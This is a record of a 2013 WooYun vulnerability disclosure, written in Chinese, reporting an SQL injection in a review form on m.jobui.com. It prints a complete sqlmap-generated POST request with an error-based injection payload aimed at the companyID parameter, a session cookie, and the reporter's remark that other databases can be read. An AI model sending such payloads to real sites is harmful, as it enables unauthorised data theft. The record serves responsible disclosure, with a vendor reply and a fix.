{"id": 6958, "wybug_id": "wooyun-2013-043025", "wybug_title": "职友集分站SQL注入—跨库依然是（N百W信息泄露）", "wybug_corp": "职友集网", "wybug_author": "xiaoL", "wybug_date": "2013-11-20 19:33", "wybug_open_date": "2014-01-04 19:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-04：\t细节向公众公开  简要描述： 分站的一处注入，不过数据库主机显然跟主站用的是一个，账号也是一个，权限也是一样。当然又是N百W信息泄露了！ 详细说明：  事发地点：http://m.jobui.com/company/10483991/review/只要是这个模板页面都一样里面有个评论，本来是测试XSS的，可是没返回，发现一个表单。测试之......\n\n又一处藏的很深的显错…为了审核大大方便，送一个post包。\nPOST /process/ HTTP/1.1Accept-language: en-us,en;q=0.5Accept-encoding: gzip,deflateAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-agent: sqlmap/1.0-dev (http://sqlmap.org)Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7Host: m.jobui.comPragma: no-cacheCache-control: no-cache,no-storeContent-type: application/x-www-form-urlencoded; charset=utf-8Cookie: jobui_user_passport=yk13845182002797;PHPSESSID=fb089o01l3n1naolma3f5mjvp6Content-length: 373Connection: closecompanyID=10483991%20AND%20%28SELECT%205643%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71706d6971%2C%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x717a6f6971%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29;-- 1&formAction=company_review_changeImpression&isMobile=ture&comment=GfuR\n如果返回-3只要增加最后一行1前面的空格就能返回了   漏洞证明：  接下来证明的事情又是SQLMAP来了这里发现情况了…竟然跨库了，那就和上次发现的主站的sql注入一样具有极大的危害了…当前数据库是jobui_company    用户依然是johui依然可以查看其他数据库的数据小小的截一张图\n\n上次看了文章觉得要保护厂商，就不列那么多了，打了码。现在知道还不迟。   修复方案：  数据库的权限分级要清楚。一切用户输入都可能是有害的。包括你们的程序员。   版权声明：转载请注明来源 xiaoL@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2013-11-20 19:56 厂商回复： 非常感谢乌云的专业！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-05 08:23 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  - -~邮箱求sqlmap各种注入语句和测试手法    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}